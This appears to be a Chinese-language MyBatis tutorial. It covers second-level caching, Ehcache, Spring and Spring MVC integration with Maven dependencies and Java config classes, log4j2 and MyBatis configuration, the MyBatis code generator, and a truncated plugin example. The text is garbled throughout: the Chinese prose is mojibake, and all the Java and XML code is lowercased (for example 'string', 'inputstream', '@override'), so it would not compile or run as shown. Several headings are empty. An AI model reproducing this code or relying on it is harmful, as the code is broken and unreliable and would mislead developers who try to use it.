éä¸ä»½æ°çæ°æ®ç»ä½ ã\n * sizeï¼ç¼å­å¤å°æ°æ®\n * typeï¼æå®ç¼å­çå¨ç±»å\n\n 3. pojoå®ç°åºååæ¥å£\n\n@test\npublic void testsecondlevel() throws ioexception {\n    string resource = "mybatis-config.xml";\n    inputstream resourceasstream = resources.getresourceasstream(resource);\n    sqlsessionfactory sqlsessionfactory = new sqlsessionfactorybuilder().build(resourceasstream);\n    sqlsession sqlsession = sqlsessionfactory.opensession();\n    sqlsession sqlsession2 = sqlsessionfactory.opensession();\n\n    employeemappercache mapper = sqlsession.getmapper(employeemappercache.class);\n    employeemappercache mapper2 = sqlsession2.getmapper(employeemappercache.class);\n    employee emp = mapper.getemp(1);\n    sqlsession.close();\n    system.out.println(mapper2.getemp(1));\n    sqlsession2.close();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\næ³¨æï¼åªæå½sqlsessionå³é­ä¹åï¼æä¼å°æ°æ®ç§»å¨å°äºçº§ç¼å­ã\n\n\n# ç¼å­ç¸å³è®¾ç½®\n\n * cacheenabled å¼å¯æèå³é­äºçº§ç¼å­ï¼éç½®å¨mybatiséç½®æä»¶settingä¸­\n * mapperéç½®æä»¶å¯¹åºçæ¥è¯¢æ ç­¾ä¸­ï¼è®¾ç½®setcache=trueï¼å¼å¯æèå³é­äºçº§ç¼å­\n * æ¯ä¸ªå¢å æ¹æ ç­¾ä¸é»è®¤æflushcache=trueï¼é»è®¤æ¸ç©ºä¸çº§ç¼å­åäºçº§ç¼å­\n * å¨æ¯ä¸ªæ¥è¯¢æ ç­¾ä¸­é»è®¤æflushcache=falseï¼é»è®¤ä¸æ¸ç©ºç¼å­\n * sqlsession.flushcache()é»è®¤æ¸ç©ºä¸çº§ç¼å­\n * localcachescope=[session|statement] æ¬å°ç¼å­ä½ç¨å\n\n\n# ç¼å­å·¥ä½åç\n\n\n\n\n# ç¬¬ä¸æ¹ç¼å­ehcache\n\n 1. å¯¼å¥ehcacheå\n\n\x3c!-- https://mvnrepository.com/artifact/org.ehcache/ehcache --\x3e\n<dependency>\n    <groupid>org.ehcache</groupid>\n    <artifactid>ehcache</artifactid>\n    <version>3.9.9</version>\n</dependency>\n\n\x3c!-- https://mvnrepository.com/artifact/org.mybatis.caches/mybatis-ehcache --\x3e\n<dependency>\n    <groupid>org.mybatis.caches</groupid>\n    <artifactid>mybatis-ehcache</artifactid>\n    <version>1.2.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 2. mapperä¸­å¼å¯äºçº§ç¼å­\n\n<cache readonly="true" eviction="fifo" size="640000" type="org.mybatis.caches.ehcache.ehcachecache" />\n<cache-ref namespace="com.pwddd.mybatis.mapper.employeemappercache"/> <!-å¼ç¨å¶ä»æä»¶çç¼å­--\x3e\n\n\n1\n2\n\n 3. éç½®ehcacheéç½®æä»¶\n\n<ehcache>\n\n\n    \x3c!--\n        ç£çå­å¨:å°ç¼å­ä¸­ææ¶ä¸ä½¿ç¨çå¯¹è±¡,è½¬ç§»å°ç¡¬ç,ç±»ä¼¼äºwindowsç³»ç»çèæåå­\n        path:æå®å¨ç¡¬çä¸å­å¨å¯¹è±¡çè·¯å¾\n     --\x3e\n    <diskstore path="java.io.tmpdir" />\n\n\n    \x3c!--\n        defaultcache:é»è®¤çç¼å­éç½®ä¿¡æ¯,å¦æä¸å ç¹æ®è¯´æ,åææå¯¹è±¡æç§æ­¤éç½®é¡¹å¤ç\n        maxelementsinmemory:è®¾ç½®äºç¼å­çä¸é,æå¤å­å¨å¤å°ä¸ªè®°å½å¯¹è±¡\n        eternal:ä»£è¡¨å¯¹è±¡æ¯å¦æ°¸ä¸è¿æ\n        timetoidleseconds:æå¤§çååæ¶é´\n        timetoliveseconds:æå¤§çå­æ´»æ¶é´\n        overflowtodisk:æ¯å¦åè®¸å¯¹è±¡è¢«åå¥å°ç£ç\n     --\x3e\n    <defaultcache maxelementsinmemory="10000" eternal="false"\n                  timetoidleseconds="120" timetoliveseconds="120" overflowtodisk="true" />\n\n    \x3c!--\n        cache:ä¸ºæå®åç§°çå¯¹è±¡è¿è¡ç¼å­çç¹æ®éç½®\n        name:æå®å¯¹è±¡çå®æ´å\n     --\x3e\n    <cache name="com.zbaccp.entity.person" maxelementsinmemory="10000" eternal="false"\n           timetoidleseconds="300" timetoliveseconds="600" overflowtodisk="true" />\n\n\n</ehcache>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# æ´åspring\n\n 1. å¯¼å¥ç¸å³ä¾èµå\n\n<dependencies>\n    \n      \x3c!--æµè¯--\x3e\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-test</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \n  <dependency>\n    <groupid>junit</groupid>\n    <artifactid>junit</artifactid>\n    <version>4.11</version>\n    <scope>test</scope>\n  </dependency>\n\n  \x3c!--spring ä¾èµ æ ¸å¿--\x3e\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-core</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-expression</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-beans</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-context</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \x3c!--spring jdbc--\x3e\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-jdbc</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-tx</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-orm</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  \x3c!--spring web--\x3e\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-web</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-webmvc</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>javax.servlet</groupid>\n    <artifactid>servlet-api</artifactid>\n    <version>2.5</version>\n    <scope>provided</scope>\n  </dependency>\n\n  <dependency>\n    <groupid>org.thymeleaf</groupid>\n    <artifactid>thymeleaf-spring5</artifactid>\n    <version>3.0.12.release</version>\n  </dependency>\n\n  \x3c!--aop--\x3e\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-aop</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>spring-aspects</artifactid>\n    <version>${spring-version}</version>\n  </dependency>\n\n  <dependency>\n    <groupid>cglib</groupid>\n    <artifactid>cglib</artifactid>\n    <version>2.2</version>\n  </dependency>\n\n  <dependency>\n    <groupid>aopalliance</groupid>\n    <artifactid>aopalliance</artifactid>\n    <version>1.0</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.aspectj</groupid>\n    <artifactid>aspectjweaver</artifactid>\n    <version>1.9.7</version>\n  </dependency>\n\n  \x3c!--mybatis--\x3e\n  <dependency>\n    <groupid>org.mybatis</groupid>\n    <artifactid>mybatis</artifactid>\n    <version>3.5.9</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.mybatis</groupid>\n    <artifactid>mybatis-spring</artifactid>\n    <version>2.0.7</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.mybatis.caches</groupid>\n    <artifactid>mybatis-ehcache</artifactid>\n    <version>1.2.2</version>\n  </dependency>\n\n  <dependency>\n    <groupid>org.ehcache</groupid>\n    <artifactid>ehcache</artifactid>\n    <version>3.9.9</version>\n  </dependency>\n    \n  <dependency>\n    <groupid>com.alibaba</groupid>\n    <artifactid>druid</artifactid>\n    <version>1.2.8</version>\n  </dependency>\n\n  <dependency>\n    <groupid>mysql</groupid>\n    <artifactid>mysql-connector-java</artifactid>\n    <version>5.1.21</version>\n  </dependency>\n    \n    \x3c!-- å¶ä»è¾å©å --\x3e\n\n  <dependency>\n    <groupid>org.apache.logging.log4j</groupid>\n    <artifactid>log4j-core</artifactid>\n    <version>2.17.1</version>\n  </dependency>\n\n    \x3c!--æä»¶ä¸ä¼ --\x3e\n\n  <dependency>\n    <groupid>commons-fileupload</groupid>\n    <artifactid>commons-fileupload</artifactid>\n    <version>1.4</version>\n  </dependency>\n    \n   \x3c!-- ååºjson --\x3e\n\n  <dependency>\n    <groupid>com.fasterxml.jackson.core</groupid>\n    <artifactid>jackson-databind</artifactid>\n    <version>2.12.1</version>\n  </dependency>\n\n\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n\n 2. éç½®web.xml(webinit)ãspringãspringmvcéç½®æä»¶\n\nweb.xml/webinit\n\npackage com.pwddd.ssmdemo.config;\n\nimport org.springframework.web.filter.characterencodingfilter;\nimport org.springframework.web.filter.hiddenhttpmethodfilter;\nimport org.springframework.web.servlet.support.abstractannotationconfigdispatcherservletinitializer;\n\nimport javax.servlet.filter;\n\npublic class webinit extends abstractannotationconfigdispatcherservletinitializer {\n    @override\n    protected class<?>[] getrootconfigclasses() {\n        return new class[]{springconfig.class};\n    }\n\n    @override\n    protected class<?>[] getservletconfigclasses() {\n        return new class[]{webconfig.class};\n    }\n\n    @override\n    protected string[] getservletmappings() {\n        return new string[]{"/"};\n    }\n\n    @override\n    protected filter[] getservletfilters() {\n        characterencodingfilter characterencodingfilter = new characterencodingfilter();\n        characterencodingfilter.setforcerequestencoding(true);\n        characterencodingfilter.setencoding("utf-8");\n        hiddenhttpmethodfilter hiddenhttpmethodfilter = new hiddenhttpmethodfilter();\n        return new filter[]{characterencodingfilter,hiddenhttpmethodfilter};\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\nspringéç½®æä»¶\n\npackage com.pwddd.ssmdemo.config;\n\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.componentscan;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.web.context.webapplicationcontext;\nimport org.springframework.web.servlet.viewresolver;\nimport org.springframework.web.servlet.config.annotation.enablewebmvc;\nimport org.springframework.web.servlet.config.annotation.viewcontrollerregistry;\nimport org.springframework.web.servlet.config.annotation.webmvcconfigurer;\nimport org.thymeleaf.spring5.springtemplateengine;\nimport org.thymeleaf.spring5.view.thymeleafviewresolver;\nimport org.thymeleaf.templatemode.templatemode;\nimport org.thymeleaf.templateresolver.itemplateresolver;\nimport org.thymeleaf.templateresolver.servletcontexttemplateresolver;\n\n@configuration\n@componentscan("com.pwddd.ssmdemo.controller")\n@enablewebmvc\npublic class webconfig implements webmvcconfigurer {\n\n    @override\n    public void addviewcontrollers(viewcontrollerregistry registry) {\n        registry.addviewcontroller("/").setviewname("index");\n    }\n\n\n    @bean\n    public itemplateresolver templateresolver(webapplicationcontext applicationcontext){\n        servletcontexttemplateresolver servletcontexttemplateresolver = new servletcontexttemplateresolver(applicationcontext.getservletcontext());\n        servletcontexttemplateresolver.setprefix("/web-inf/templates/");\n        servletcontexttemplateresolver.setsuffix(".html");\n        servletcontexttemplateresolver.setcharacterencoding("utf-8");\n        servletcontexttemplateresolver.settemplatemode(templatemode.html);\n        return servletcontexttemplateresolver;\n    }\n\n    @bean\n    public springtemplateengine templateengine(itemplateresolver templateresolver){\n        springtemplateengine springtemplateengine = new springtemplateengine();\n        springtemplateengine.settemplateresolver(templateresolver);\n        return springtemplateengine;\n    }\n\n    @bean\n    public viewresolver viewresolver(springtemplateengine templateengine){\n        thymeleafviewresolver thymeleafviewresolver = new thymeleafviewresolver();\n        thymeleafviewresolver.settemplateengine(templateengine);\n        thymeleafviewresolver.setcharacterencoding("utf-8");\n        return thymeleafviewresolver;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\nspringmvc\n\npackage com.pwddd.ssmdemo.config;\n\nimport com.alibaba.druid.pool.druiddatasource;\nimport org.mybatis.spring.sqlsessionfactorybean;\nimport org.mybatis.spring.annotation.mapperscan;\nimport org.springframework.beans.factory.annotation.value;\nimport org.springframework.context.applicationcontext;\nimport org.springframework.context.annotation.*;\nimport org.springframework.jdbc.datasource.datasourcetransactionmanager;\nimport org.springframework.transaction.annotation.enabletransactionmanagement;\n\nimport javax.sql.datasource;\nimport java.io.ioexception;\n\n@configuration\n@componentscan("com.pwddd.ssmdemo.service")\n@propertysource("classpath:jdbc.properties")\n@mapperscan("com.pwddd.ssmdemo.mapper")  // éç½®mapperæ«æ\n@enabletransactionmanagement  // å¼å¯äºå¡\n@enableaspectjautoproxy(proxytargetclass = true)  // å¼å¯aop aspectæ³¨è§£\npublic class springconfig {\n\n    @value("${jdbc.driver}")\n    private string driver;\n\n    @value("${jdbc.url}")\n    private string url;\n\n    @value("${jdbc.username}")\n    private string username;\n\n    @value("${jdbc.password}")\n    private string password;\n\n    @bean\n    public datasource datasource(){\n        druiddatasource druiddatasource = new druiddatasource();\n        druiddatasource.setdriverclassname(driver);\n        druiddatasource.seturl(url);\n        druiddatasource.setusername(username);\n        druiddatasource.setpassword(password);\n        return druiddatasource;\n    }\n\n    @bean\n    public datasourcetransactionmanager datasourcetransactionmanager(datasource datasource){\n        datasourcetransactionmanager datasourcetransactionmanager = new datasourcetransactionmanager();\n        datasourcetransactionmanager.setdatasource(datasource);\n        return datasourcetransactionmanager;\n    }\n\n    @bean\n    public sqlsessionfactorybean sqlsessionfactorybean(datasource datasource, applicationcontext applicationcontext) throws ioexception {\n        sqlsessionfactorybean sqlsessionfactorybean = new sqlsessionfactorybean();\n        sqlsessionfactorybean.setdatasource(datasource);\n        sqlsessionfactorybean.setconfiglocation(applicationcontext.getresource("classpath:mybatis-config.xml"));\n//        sqlsessionfactorybean.setmapperlocations(applicationcontext.getresources("classpath:mapper/*.xml"));\n        return sqlsessionfactorybean;\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\njdbc.properties\n\njdbc.driver=com.mysql.jdbc.driver\njdbc.url=jdbc:mysql://localhost:3306/ssmdemo\njdbc.username=root\njdbc.password=123456\n\n\n1\n2\n3\n4\n\n\nlog4j2éç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n\x3c!--è®¾ç½®log4j2çèªèº«logçº§å«ä¸ºwarn--\x3e\n\x3c!--æ¥å¿çº§å«ä»¥åä¼åçº§æåº: off > fatal > error > warn > info > debug > trace > all --\x3e\n\x3c!--configurationåé¢çstatusï¼è¿ä¸ªç¨äºè®¾ç½®log4j2èªèº«åé¨çä¿¡æ¯è¾åºï¼å¯ä»¥ä¸è®¾ç½®ï¼\n    å½è®¾ç½®ætraceæ¶ï¼ä½ ä¼çå°log4j2åé¨åç§è¯¦ç»è¾åº--\x3e\n\x3c!--monitorintervalï¼log4jè½å¤èªå¨æ£æµä¿®æ¹éç½® æä»¶åéæ°éç½®æ¬èº«ï¼è®¾ç½®é´éç§æ°--\x3e\n<configuration status="warn" monitorinterval="30">\n    \x3c!--å¨å±åæ°--\x3e\n    <properties>\n        \x3c!--<property name="logpath">/export/logs/bt-middle-data-main</property>--\x3e\n        <property name="logpath">./log</property>\n    </properties>\n    \x3c!--åå®ä¹ææçappender--\x3e\n    <appenders>\n        \x3c!--è¿ä¸ªè¾åºæ§å¶å°çéç½®--\x3e\n        <console name="console" target="system_out">\n            \x3c!--æ§å¶å°åªè¾åºlevelåä»¥ä¸çº§å«çä¿¡æ¯ï¼onmatchï¼ï¼å¶ä»çç´æ¥æç»ï¼onmismatchï¼ --\x3e\n            \x3c!--<thresholdfilter level="debug" onmatch="accept" onmismatch="deny"/>--\x3e\n            \x3c!--è¾åºæ¥å¿çæ ¼å¼--\x3e\n            <patternlayout pattern="[%d{yyyy-mm-dd hh:mm:ss:sss}-%t] [%p] - %l - %m%n"/>\n        </console>\n        \x3c!--æä»¶ä¼æå°åºææä¿¡æ¯ï¼è¿ä¸ªlogæ¯æ¬¡è¿è¡ç¨åºä¼èªå¨æ¸ç©ºï¼ç±appendå±æ§å³å®ï¼è¿ä¸ªä¹æºæç¨çï¼éåä¸´æ¶æµè¯ç¨--\x3e\n        \x3c!--<file name="log" filename="log/test.log" append="false">--\x3e\n        \x3c!--<patternlayout pattern="%d{hh:mm:ss.sss} %-5level %class{36} %l %m - %msg%xex%n"/>--\x3e\n        \x3c!--</file>--\x3e\n        \x3c!-- è¿ä¸ªä¼æå°åºææçinfoåä»¥ä¸çº§å«çä¿¡æ¯ï¼æ¯æ¬¡å¤§å°è¶è¿sizeï¼\n        åè¿sizeå¤§å°çæ¥å¿ä¼èªå¨å­å¥æå¹´ä»½-æä»½å»ºç«çæä»¶å¤¹ä¸é¢å¹¶è¿è¡åç¼©ï¼ä½ä¸ºå­æ¡£--\x3e\n        <rollingfile name="rollingfileinfo" filename="${logpath}/info.log"\n                     filepattern="${logpath}/info_%d{yyyy-mm-dd}.log">\n            \x3c!--<filters>--\x3e\n            \x3c!--<!âæ§å¶å°åªè¾åºlevelåä»¥ä¸çº§å«çä¿¡æ¯ï¼onmatchï¼ï¼å¶ä»çç´æ¥æç»ï¼onmismatchï¼â>--\x3e\n            \x3c!--<thresholdfilter level="info" onmatch="accept" onmismatch="deny"/>--\x3e\n            \x3c!--<!â<thresholdfilter level="warn" onmatch="deny" onmismatch="neutral"/>â>--\x3e\n            \x3c!--</filters>--\x3e\n            <patternlayout pattern="[%d{yyyy-mm-dd hh:mm:ss:sss}-%t] [%p] - %l - %m%n"/>\n            <policies>\n                \x3c!--æç§filepattern æ¶é´åä½ interval é´éçææä»¶--\x3e\n                <timebasedtriggeringpolicy modulate="true" interval="1"/>\n                \x3c!--å®äºå½æ¥å¿æä»¶è¾¾å°äºæå®çsizeæ¶ï¼è§¦årolloveræä½ãsizeåæ°å¯ä»¥ç¨kbãmbãgbç­ååç¼æ¥æå®å·ä½çå­èæ°--\x3e\n                \x3c!--<sizebasedtriggeringpolicy size="1g"/>--\x3e\n            </policies>\n        </rollingfile>\n\n\n    </appenders>\n    \x3c!--ç¶åå®ä¹loggerï¼åªæå®ä¹äºloggerå¹¶å¼å¥çappenderï¼appenderæä¼çæ--\x3e\n    <loggers>\n        \x3c!--è¿æ»¤æspringåhibernateçä¸äºæ ç¨çdebugä¿¡æ¯--\x3e\n        <logger name="org.springframework" level="debug">\n        </logger>\n        <logger name="org.elasticsearch" level="info">\n        </logger>\n        <logger name="com.jd.jsf.gd" level="warn">\n        </logger>\n        <logger name="org.mybatis" level="debug">\n        </logger>\n        \x3c!-- å°ä¸å¡daoæ¥å£å¡«åè¿å»,å¹¶ç¨æ§å¶å°è¾åºå³å¯ --\x3e\n        <logger name="com.pwddd.ssmdemo.mapper" level="debug" additivity="false">\n            <appender-ref ref="console"/>\n            <appender-ref ref="rollingfileinfo"/>\n        </logger>\n\n        <root level="info">\n            <appender-ref ref="console"/>\n            <appender-ref ref="rollingfileinfo"/>\n        </root>\n    </loggers>\n\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\nmybatis-config.xmléç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype configuration\n        public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    <settings>\n        <setting name="mapunderscoretocamelcase" value="true"/>\n        <setting name="lazyloadingenabled" value="true"/>\n        \x3c!--        æç§éè¦è¿è¡å±æ§çå è½½--\x3e\n        <setting name="aggressivelazyloading" value="false"/>\n        <setting name="cacheenabled" value="true"/>\n    </settings>\n\n    <typealiases>\n\x3c!--        <typealias type="com.pwddd.mybatis.bean.employee" alias="emp" />--\x3e\n        <package name="com.pwddd.ssmdemo.bean"/>\n    </typealiases>\n</configuration>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nehcache.xmléç½®æä»¶\n\n<ehcache>\n\n\n    \x3c!--\n        ç£çå­å¨:å°ç¼å­ä¸­ææ¶ä¸ä½¿ç¨çå¯¹è±¡,è½¬ç§»å°ç¡¬ç,ç±»ä¼¼äºwindowsç³»ç»çèæåå­\n        path:æå®å¨ç¡¬çä¸å­å¨å¯¹è±¡çè·¯å¾\n     --\x3e\n    <diskstore path="java.io.tmpdir" />\n\n\n    \x3c!--\n        defaultcache:é»è®¤çç¼å­éç½®ä¿¡æ¯,å¦æä¸å ç¹æ®è¯´æ,åææå¯¹è±¡æç§æ­¤éç½®é¡¹å¤ç\n        maxelementsinmemory:è®¾ç½®äºç¼å­çä¸é,æå¤å­å¨å¤å°ä¸ªè®°å½å¯¹è±¡\n        eternal:ä»£è¡¨å¯¹è±¡æ¯å¦æ°¸ä¸è¿æ\n        timetoidleseconds:æå¤§çååæ¶é´\n        timetoliveseconds:æå¤§çå­æ´»æ¶é´\n        overflowtodisk:æ¯å¦åè®¸å¯¹è±¡è¢«åå¥å°ç£ç\n     --\x3e\n    <defaultcache maxelementsinmemory="10000" eternal="false"\n                  timetoidleseconds="120" timetoliveseconds="120" overflowtodisk="true" />\n\n    \x3c!--\n        cache:ä¸ºæå®åç§°çå¯¹è±¡è¿è¡ç¼å­çç¹æ®éç½®\n        name:æå®å¯¹è±¡çå®æ´å\n     --\x3e\n    <cache name="com.zbaccp.entity.person" maxelementsinmemory="10000" eternal="false"\n           timetoidleseconds="300" timetoliveseconds="600" overflowtodisk="true" />\n</ehcache>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# éåå·¥ç¨\n\nmybatisä»£ç çæå¨æ¯mybatisæä¾çä¸ä¸ªæ ¹æ®æ°æ®åºè¡¨éåèªå¨çæxmlãjavabeanç­ç±»çå·¥å·ã\n\nmybatiséåå·¥ç¨éç½®ï¼\n\n 1. å¼å¥mybatis-gentator\n\n<dependency>\n    <groupid>org.mybatis.generator</groupid>\n    <artifactid>mybatis-generator-core</artifactid>\n    <version>1.3.7</version>\n</dependency>\n\n<dependency>\n    <groupid>org.mybatis.generator</groupid>\n    <artifactid>mybatis-generator-maven-plugin</artifactid>\n    <version>1.3.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. ç¼åéç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n<!doctype generatorconfiguration\n        public "-//mybatis.org//dtd mybatis generator configuration 1.0//en"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorconfiguration>\n\n    \x3c!--\n        targetruntime="mybatis3simple":çæç®åççcrud\n        mybatis3:è±ªåç\n     --\x3e\n    <context id="mysqltables" targetruntime="mybatis3">\n        \x3c!-- jdbcconnectionï¼æå®å¦ä½è¿æ¥å°ç®æ æ°æ®åº --\x3e\n        <jdbcconnection driverclass="com.mysql.jdbc.driver"\n                        connectionurl="jdbc:mysql://localhost:3306/mybatis?allowmultiqueries=true"\n                        userid="root"\n                        password="123456">\n        </jdbcconnection>\n\n        \x3c!--  --\x3e\n        <javatyperesolver >\n            <property name="forcebigdecimals" value="false" />\n        </javatyperesolver>\n\n        \x3c!-- javamodelgeneratorï¼æå®javabeanççæç­ç¥\n        targetpackage="test.model"ï¼ç®æ åå\n        targetproject="\\mbgtestproject\\src"ï¼ç®æ å·¥ç¨\n        --\x3e\n        <javamodelgenerator targetpackage="com.pwddd.mybatis.bean"\n                            targetproject=".\\src\\main\\java\\">\n            <property name="enablesubpackages" value="true" />\n            <property name="trimstrings" value="true" />\n        </javamodelgenerator>\n\n        \x3c!-- sqlmapgeneratorï¼sqlæ å°çæç­ç¥ï¼ --\x3e\n        <sqlmapgenerator targetpackage="mapper"\n                         targetproject=".\\src\\main\\resources\\">\n            <property name="enablesubpackages" value="true" />\n        </sqlmapgenerator>\n\n        \x3c!-- javaclientgenerator:æå®mapperæ¥å£æå¨çä½ç½® --\x3e\n        <javaclientgenerator type="xmlmapper" targetpackage="com.pwddd.mybatis.dao"\n                             targetproject=".\\src\\main\\java\\">\n            <property name="enablesubpackages" value="true" />\n        </javaclientgenerator>\n\n        \x3c!-- æå®è¦éååæåªäºè¡¨ï¼æ ¹æ®è¡¨è¦åå»ºjavabean --\x3e\n        <table tablename="tbl_dept" domainobjectname="department"></table>\n        <table tablename="tbl_employee" domainobjectname="employee"></table>\n    </context>\n</generatorconfiguration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 3. è¿è¡\n\n@test\npublic void mbg() throws xmlparserexception, ioexception, invalidconfigurationexception, sqlexception, interruptedexception {\n\nlist<string> warnings = new arraylist<string>();\n    boolean overwrite = true;\n    file configfile = new file("mbg.xml");\n    configurationparser cp = new configurationparser(warnings);\n    configuration config = cp.parseconfiguration(configfile);\n    defaultshellcallback callback = new defaultshellcallback(overwrite);\n    mybatisgenerator mybatisgenerator = new mybatisgenerator(config, callback, warnings);\n    mybatisgenerator.generate(null);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# mybatisè¿è¡åç\n\n\n\n\n\n\n# åå»ºsqlsessionfactory\n\n\n\n\n# åå»ºsqlsession\n\n\n\n\n# è·åmapperçä»£çç±»å¯¹è±¡\n\n\n\n\n# æ§è¡æ¥è¯¢\n\n\n\n\n# æµç¨æ»ç»\n\n\n\n\n# æä»¶\n\n\n# åç\n\n 1. å¨åå¤§å¯¹è±¡åå»ºçè¿ç¨ä¸­ï¼é½ä¼æ§è¡interceptorchain.pluginall(param);,è·åå°ææçinterceptorï¼è°ç¨interceptor.plugin(target) è¿åtargetåè£ä¹åçå¯¹è±¡ã\n 2. æä»¬å¯ä»¥ä¸ºåå¤§å¯¹è±¡åå»ºä¸ä¸ªä»£çå¯¹è±¡ï¼aopåé¢ç¼ç¨çææ³ãéè¿ä»£çå¯¹è±¡æä»¬å°±è½æ¦æªå°åå¤§å¯¹è±¡ä¸­æ§è¡çæ¹æ³ã\n\n\n# ç¼åæä»¶\n\n 1. å®ç°interceptoræ¥å£\n 2. å®ç°ç¸å³æ¹æ³\n 3. ä½¿ç¨@interceptorå®ç°æä»¶ç­¾å\n 4. å°æä»¶æ³¨åå°mybatiséç½®æä»¶ä¸­\n\npackage com.pwddd.mybatis.plugins;\n\nimport org.apache.ibatis.executor.statement.statementhandler;\nimport org.apache.ibatis.plugin.*;\n\nimport java.util.properties;\n\n@intercepts(\n        @signature(\n                type = statementhandler.class,\n                method="parameterize",\n                args=java.sql.statement.class\n        )\n)\npublic class myfirstplugin implements interceptor {\n\n    @override\n    public object intercept(invocation invocation) throws throwable {\n        return invocation.proceed();\n    }\n\n    @override\n    public object plugin(object target) {\n        return plugin.wrap(target,this);\n    }\n\n    @override\n    public void setproperties(properties properties) {\n\n    